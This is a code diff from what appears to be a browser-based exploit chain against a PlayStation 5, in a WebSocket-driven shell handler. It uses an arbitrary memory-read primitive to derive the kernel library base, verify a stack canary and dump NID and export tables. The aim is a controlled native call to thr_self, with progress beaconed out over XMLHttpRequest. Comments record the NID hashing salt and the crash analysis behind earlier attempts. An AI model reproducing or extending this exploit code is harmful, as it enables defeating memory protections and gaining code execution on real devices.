@@ -5434,24 +5434,18 @@ function _startWsShell(){
       }
 
       case 'e2witness':{
-        /* v14 - THE ROBUST CHAIN + THE NID HARVEST. Sessions 50-51 taught:
-         * (1) the entry/thread-record/pthread slot layouts VARY per session
-         * (zero slots, non-first nodes) - every step now SCANS its region
-         * for the first plausible value instead of fixed indices, with the
-         * backlink walk (up to 4 hops) until residue 0x218; (2) the
-         * gettimeofday call is RETIRED as the witness (2/2 deterministic
-         * deaths at the call moment: RSI - the uncontrolled tz pointer -
-         * points into the live frame machinery; the tz copyout corrupts it;
-         * the engine dies at the return path BEFORE the scope read runs).
-         * THE NEW TARGET: thr_self (syscall 432, ONE pointer argument = the
-         * TID output = RDI = the fake scope; NO second argument exists; the
-         * reply posts cleanly). Its RVA resolves via the export table:
-         * entries {hi: text_rva - 0x48000, lo: NID}; the entry at text 0xB50
-         * (gettimeofday, named-import-proven) yields NID(gettimeofday) ->
-         * the hash encoding cracks offline -> NID(thr_self) -> its entry ->
-         * its text RVA -> the single-argument call. This command derives
-         * the base, verifies the canary, and dumps the entries [512..0x82C)
-         * for the NID hunt. */
+        /* v16 - THE ROBUST CHAIN + THE NID TABLE READER. The NID
+         * computation is CRACKED (ps5rs algorithm.rs: SHA1(name + salt
+         * 518D64A635DED8C1E6B039B1C3E55230) -> reverse first 8 bytes ->
+         * custom base64 with +- alphabet). thr_self NID = COc2Ua29+pI.
+         * This command: (1) derives lk_base via the pthread-backlink chain
+         * (proven 6/6), (2) reads the NID table at data+0x3800..+0x4400
+         * (= lk_base + 0x6C000 + offset) dumping all 0xFFFF-class entries
+         * {nid, text_rva}, (3) dumps the export table [0..64) at lk+0x48000
+         * for cross-reference. Offline: match NID table entries against
+         * computed NIDs to identify thr_self's text RVA -> the single-arg
+         * witness call (thr_self writes TID to RDI = fake scope, touches
+         * nothing else, no second argument exists). */
         if(!S.neEntry||!S.batt){reply.err='No NE target';break;}
         function EW(s){try{var x=new XMLHttpRequest();x.open('POST','/beacon/'+encodeURIComponent('E2W-'+s),false);x.send();}catch(e){}}
         try{
@@ -5482,30 +5476,41 @@ function _startWsShell(){
           if(!(can>0x1000000n)){reply.err='canary fail: 0x'+can.toString(16);break;}
           reply.base='0x'+B.toString(16);
           reply.canary='0x'+can.toString(16);
-          /* v15 THE NAME-RECORD HARVEST: the call ABI is proven from the
-           * 1400 source (RSI = cfr hardcoded by the nativeCallTrampoline -
-           * the gettimeofday tz-write kills the frame deterministically;
-           * the tv-write lands FIRST every time). THE ROUTE: the entries'
-           * A-fields are offsets into the SECONDARY SECTION (table+0x416C),
-           * within the readable band; the records carry 20-byte SHA1s.
-           * Read the name records for the STUB-REGION entries (the low-text
-           * ladder where the syscall stubs live: 0xD0..0x1100-class), match
-           * offline against SHA1("thr_self") etc., identify the ONE-ARG
-           * stub (thr_self writes the TID to RDI - our scope - and touches
-           * NOTHING else), and call it. */
-          var tbl=B+0x48000n;
-          var nrecs=[];
-          for(var offN=0xC;offN<0x1000&&nrecs.length<400;offN+=8){
-            var e1=S.absRead(tbl+BigInt(offN),8)[0];
-            var aF=Number(e1>>32n);
-            var sR=Number(e1&0xFFFFFFFFn);
-            if(aF>=0x6000&&aF<0x16000){
-              var rec=S.absRead(tbl+0x416Cn+BigInt(aF),0x20);
-              nrecs.push({t:'0x'+(0x48000n+BigInt(BigInt.asUintN(32,BigInt(sR)))-0x100000000n>0n?BigInt(BigInt.asIntN(32,BigInt(sR))):BigInt(sR)).toString(16),a:'0x'+aF.toString(16),r:rec.map(function(w){return'0x'+w.toString(16);})});
+          /* v16 THE NID TABLE READER: the NID computation is CRACKED
+           * (ps5rs algorithm.rs: SHA1(name + salt 518D64A6...) -> reverse
+           * first 8 bytes -> custom base64 +-). The NID TABLE at
+           * data+0x3B58 (= lk_base + 0x6C000 + 0x3B58 = lk_base + 0x6FB58)
+           * has entries {NID(hi32), text_rva(lo32)} where NID = 0xFFFFxxxx.
+           * The game lane confirmed: first 0xFFFF entry at data+0x3B58,
+           * NID table extends to data+0x42C8.
+           * Read the full table, dump {nid, text_rva} pairs for offline
+           * matching against computed NIDs (thr_self = COc2Ua29+pI etc).
+           * ALSO dump the export table at lk+0x48000 for cross-reference. */
+          var ntbl=B+0x6C000n;
+          var nidEntries=[];
+          /* scan data+0x3800..data+0x4400 for ALL 0xFFFF-class entries */
+          for(var offN=0x3800;offN<0x4400;offN+=8){
+            var eq=S.absRead(ntbl+BigInt(offN),8)[0];
+            var nhi=Number(eq>>32n);
+            var nlo=Number(eq&0xFFFFFFFFn);
+            if(nhi>=0xFFFF0000&&nhi<=0xFFFFFFFF&&nlo>0&&nlo<0x100000){
+              nidEntries.push({off:'0x'+offN.toString(16),nid:'0x'+nhi.toString(16).toUpperCase(),rva:'0x'+nlo.toString(16)});
             }
           }
-          reply.nrecs=nrecs.slice(0,120);
-          EW('7 NAME RECORDS n='+nrecs.length);
+          reply.nidTable=nidEntries;
+          EW('6 NID TABLE n='+nidEntries.length);
+          /* ALSO: dump the export table entries [0..64) for cross-ref */
+          var tbl=B+0x48000n;
+          var expEntries=[];
+          for(var offE=0xC;offE<0xC+64*8;offE+=8){
+            var e1=S.absRead(tbl+BigInt(offE),8)[0];
+            var aF=Number(e1>>32n);
+            var sR=Number(e1&0xFFFFFFFFn);
+            var txt=0x48000+Number(BigInt.asIntN(32,BigInt(sR)));
+            expEntries.push({idx:(offE-0xC)/8,a:'0x'+aF.toString(16),text:'0x'+txt.toString(16)});
+          }
+          reply.expTable=expEntries;
+          EW('7 EXPORT TABLE n='+expEntries.length);
         }catch(e2){reply.err='chain fault: '+String(e2&&e2.message?e2.message:'?');}
         break;
       }
